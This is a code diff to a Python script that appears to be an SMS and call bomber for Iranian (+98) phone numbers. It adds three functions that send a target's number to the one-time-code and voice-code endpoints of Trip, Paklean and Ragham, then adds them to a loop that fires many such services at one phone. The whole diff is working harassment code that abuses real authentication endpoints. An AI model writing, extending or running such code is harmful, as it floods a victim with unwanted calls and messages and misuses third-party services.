@@ -41,6 +41,50 @@ def check_internet():
 # ------------------------------
 # SMS services
 # ------------------------------
+def trip_call(phone):
+    url = "https://gateway.trip.ir/api/Totp"
+    payload = {"PhoneNumber": "0" + phone.split("+98")[1]}
+    try:
+        response = post(url, json=payload, timeout=5)
+        if response.status_code == 200:
+            print(f'{g}(Trip - Call) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (Trip - Call) Failed or No Response{a}')
+    except Exception as e:
+        print(f'{r}[!] Trip - Call Exception: {e}{a}')
+        return False
+
+def paklean_call(phone):
+    url = "https://client.api.paklean.com/user/resendVoiceCode"
+    payload = {"username": "0" + phone.split("+98")[1]}
+    try:
+        response = post(url, json=payload, timeout=5)
+        if response.status_code == 200:
+            print(f'{g}(Paklean - Call) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (Paklean - Call) Failed or No Response{a}')
+    except Exception as e:
+        print(f'{r}[!] Paklean - Call Exception: {e}{a}')
+        return False
+
+def ragham_call(phone):
+    url = "https://web.raghamapp.com/api/users/code"
+    payload = {"phone": phone}  # اینجا نیازی به 0 نیست، همون phone که میدی
+    try:
+        response = post(url, json=payload, timeout=5)
+        if response.status_code == 200:
+            print(f'{g}(Ragham - Call) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (Ragham - Call) Failed or No Response{a}')
+    except Exception as e:
+        print(f'{r}[!] Ragham - Call Exception: {e}{a}')
+        return False
+
+
+
 def snap(phone):
     snapH = {"Host": "app.snapp.taxi", "content-type": "application/json"}
     snapD = {"cellphone": phone}
@@ -180,7 +224,8 @@ def send_service_safe(service, phone):
 def Vip(phone, Time):
     services = [
     snap, gap, divar, alibaba, mek, okorosh,
-    drnext, pindo, shahrfarsh, tetherland, snapp_market
+    drnext, pindo, shahrfarsh, tetherland, snapp_market,
+    trip_call, paklean_call, ragham_call
 ]
     total_services = len(services)
     
